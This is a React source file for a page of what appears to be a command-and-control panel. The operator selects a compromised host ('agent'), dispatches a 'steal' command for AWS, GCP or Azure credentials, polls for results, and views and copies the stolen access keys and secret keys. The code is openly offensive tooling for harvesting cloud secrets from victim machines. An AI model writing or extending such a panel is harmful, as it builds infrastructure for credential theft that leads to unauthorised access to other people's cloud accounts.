"use client";

import { useEffect, useState, useCallback, useRef } from "react";
import { api } from "@/lib/api";
import { paths } from "@/lib/api-paths";
import { EmptyState } from "@/components/ui/empty-state";
import { PageContainer } from "@/components/ui/page-container";
import { Spinner } from "@/components/ui/spinner";
import { useAgentList } from "@/lib/hooks/useAgentList";
import { POLL } from "@/lib/polling";
import { Card } from "@/components/ui/card";
import { Banner } from "@/components/ui/banner";
import { IconBadge } from "@/components/ui/icon-badge";
import { Button } from "@/components/ui/button";
import { CopyButton } from "@/components/ui/copy-button";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Skeleton } from "@/components/ui/skeleton";
import { toast } from "sonner";
import { Check, Cloud, CloudUpload, Copy, List } from "lucide-react";
import { useI18n } from "@/lib/i18n";

import type { Agent } from "@/types/agent";


interface CloudCred {
  id: number;
  agent_id: string;
  provider: string;
  access_key_id: string;
  secret_key: string;
  session_token: string;
  region: string;
  account_id: string;
  account_name: string;
  permissions: string;
  raw_output: string;
}

interface CloudResultsResponse {
  results: CloudCred[];
}

export default function CloudPage() {
  const { t } = useI18n();
  const { agents, loading: agentsLoading } = useAgentList();
  const [selectedAgent, setSelectedAgent] = useState("");
  const [provider, setProvider] = useState("aws");
  const [stealing, setStealing] = useState(false);
  const [results, setResults] = useState<CloudCred[]>([]);
  const [selectedAgentResults, setSelectedAgentResults] = useState("");
  const [pollNote, setPollNote] = useState("");
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const loadResults = useCallback(async (agentId: string, quiet = false): Promise<number> => {
    if (!agentId) return 0;
    try {
      const data: CloudResultsResponse = await api.get<CloudResultsResponse>(`/cloud/${agentId}/results`);
      const list = data.results || [];
      setResults(list);
      return list.length;
    } catch {
      if (!quiet) toast.error(t("cloud.load_results_failed"));
      return -1;
    }
  }, [t]);

  useEffect(() => {
    if (selectedAgentResults) loadResults(selectedAgentResults);
  }, [selectedAgentResults, loadResults]);

  useEffect(() => () => {
    if (pollRef.current) clearInterval(pollRef.current);
  }, []);

  const handleSteal = async () => {
    if (!selectedAgent) return;
    setStealing(true);
    setPollNote("");
    try {
      await api.postJson(paths.cloud.steal, { agent_id: selectedAgent, provider });
      toast.success(t("cloud.steal_dispatched"));
      setSelectedAgentResults(selectedAgent);
      const baselineRaw = await loadResults(selectedAgent, true);
      const baseline = baselineRaw >= 0 ? baselineRaw : 0;
      let attempts = 0;
      if (pollRef.current) clearInterval(pollRef.current);
      setPollNote(t("cloud.poll_waiting"));
      pollRef.current = setInterval(async () => {
        attempts += 1;
        const n = await loadResults(selectedAgent, true);
        const count = n >= 0 ? n : 0;
        if (count > baseline) {
          setPollNote(t("cloud.poll_updated"));
          if (pollRef.current) clearInterval(pollRef.current);
          pollRef.current = null;
          toast.success(t("cloud.poll_updated"));
        } else if (attempts >= 30) {
          setPollNote(t("cloud.poll_timeout"));
          if (pollRef.current) clearInterval(pollRef.current);
          pollRef.current = null;
        }
      }, POLL.stealPoll);
    } catch { toast.error(t("cloud.steal_failed")); }
    setStealing(false);
  };

  const getAgentId = (a: Agent) => a.id || "";
  const getHostname = (a: Agent) => a.hostname || "";
  const getIP = (a: Agent) => a.ip || "";
  return (
    <PageContainer title={t("cloud.title")} subtitle={t("cloud.subtitle")}>
      <Banner tone="warning" className="items-start">
        <div className="font-semibold">{t("cloud.experimental_title")}</div>
        <div className="text-xs text-muted-foreground mt-0.5">{t("cloud.experimental_desc")}</div>
      </Banner>

      <Card className="p-(--card-spacing)">
        <div className="flex items-center gap-x-3 mb-5">
          <IconBadge icon={Cloud} color="info" size="xl" />
          <div>
            <div className="text-sm font-semibold text-foreground">{t("cloud.dispatch_title")}</div>
            <div className="text-xs text-muted-foreground">{t("cloud.dispatch_desc")}</div>
          </div>
        </div>
        <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
          <div>
            <span className="block text-xs font-semibold text-muted-foreground mb-1.5">{t("cloud.target_agent")}</span>
            {agentsLoading ? (
              <Skeleton className="h-10 rounded-lg" />
            ) : (
            <Select value={selectedAgent} onValueChange={(v) => setSelectedAgent(v ?? "")}>
              <SelectTrigger className="w-full">
                <SelectValue placeholder={t("cloud.select_agent")} />
              </SelectTrigger>
              <SelectContent>
                {agents.map(a => {
                  const id = getAgentId(a);
                  return <SelectItem key={id} value={String(id)}>{getHostname(a)} ({getIP(a)})</SelectItem>;
                })}
              </SelectContent>
            </Select>
            )}
          </div>
          <div>
            <span className="block text-xs font-semibold text-muted-foreground mb-1.5">{t("cloud.provider")}</span>
            <Select value={provider} onValueChange={(v) => setProvider(v ?? "")}>
              <SelectTrigger className="w-full">
                <SelectValue />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="aws">AWS</SelectItem>
                <SelectItem value="gcp">GCP</SelectItem>
                <SelectItem value="azure">Azure</SelectItem>
                <SelectItem value="all">{t("cloud.all_providers")}</SelectItem>
              </SelectContent>
            </Select>
          </div>
          <div className="flex flex-col justify-end gap-1">
            <Button onClick={handleSteal} disabled={stealing || !selectedAgent}>
              {stealing ? <Spinner size="xs" /> : <CloudUpload className="size-4" />}
              <span>{stealing ? t("cloud.dispatching") : t("cloud.steal_btn")}</span>
            </Button>
            {pollNote && <span className="text-(--fs-xs-sm) text-muted-foreground">{pollNote}</span>}
          </div>
        </div>
      </Card>

      <Card className="p-(--card-spacing)">
        <div className="flex items-center gap-x-3 mb-5">
          <IconBadge icon={List} color="primary" size="xl" className="dark:bg-primary/20" />
          <div>
            <div className="text-sm font-semibold text-foreground">{t("cloud.stolen_title")}</div>
            <div className="text-xs text-muted-foreground">{t("cloud.stolen_desc")}</div>
          </div>
        </div>
        <div className="mb-4">
          <span className="block text-xs font-semibold text-muted-foreground mb-1.5">{t("cloud.filter_agent")}</span>
          <Select value={selectedAgentResults} onValueChange={(v) => setSelectedAgentResults(v ?? "")}>
            <SelectTrigger className="w-full md:w-64">
              <SelectValue placeholder={t("cloud.select_agent")} />
            </SelectTrigger>
            <SelectContent>
              {agents.map(a => {
                const id = getAgentId(a);
                return <SelectItem key={id} value={String(id)}>{getHostname(a)} ({getIP(a)})</SelectItem>;
              })}
            </SelectContent>
          </Select>
        </div>
        {results.length > 0 ? (
          <Table>
            <TableHeader>
              <TableRow className="bg-muted">
                <TableHead>{t("cloud.col_provider")}</TableHead>
                <TableHead>{t("cloud.col_access_key")}</TableHead>
                <TableHead>{t("cloud.col_secret_key")}</TableHead>
                <TableHead>{t("cloud.col_actions")}</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {results.map((cred) => (
                <TableRow key={cred.id}>
                  <TableCell>
                    <Badge variant="secondary" className={`text-(--fs-micro-sm) px-2 py-0.5 rounded-full font-medium ${
                      cred.provider === "aws" ? "bg-warning/15 text-warning dark:bg-warning/20 dark:text-warning" :
                      cred.provider === "gcp" ? "bg-primary/10 text-primary" :
                      cred.provider === "azure" ? "bg-info/15 text-info" :
                      ""
                    }`}>
                      {cred.provider.toUpperCase()}
                    </Badge>
                  </TableCell>
                  <TableCell className="font-mono text-xs text-muted-foreground">
                    {cred.access_key_id || "(raw)"}
                  </TableCell>
                  <TableCell className="font-mono text-xs text-muted-foreground max-w-[200px] truncate">
                    {cred.secret_key ? cred.secret_key.substring(0, 40) + "..." : "-"}
                  </TableCell>
                  <TableCell>
                    <CopyButton
                      text={`Provider: ${cred.provider}\nAccess Key: ${cred.access_key_id || "N/A"}\nSecret Key: ${cred.secret_key || "N/A"}\n`}
                      title={t("cloud.copy")}
                      className="px-3"
                    >
                      {(copied) => (
                        <>
                          {copied ? <Check className="size-4" /> : <Copy className="size-4" />}
                          {t("cloud.copy")}
                        </>
                      )}
                    </CopyButton>
                  </TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
          ) : (
              <EmptyState icon={Cloud} title={t("cloud.empty_title")} message={t("cloud.empty_message")} />
          )}
      </Card>
    </PageContainer>
  );
}

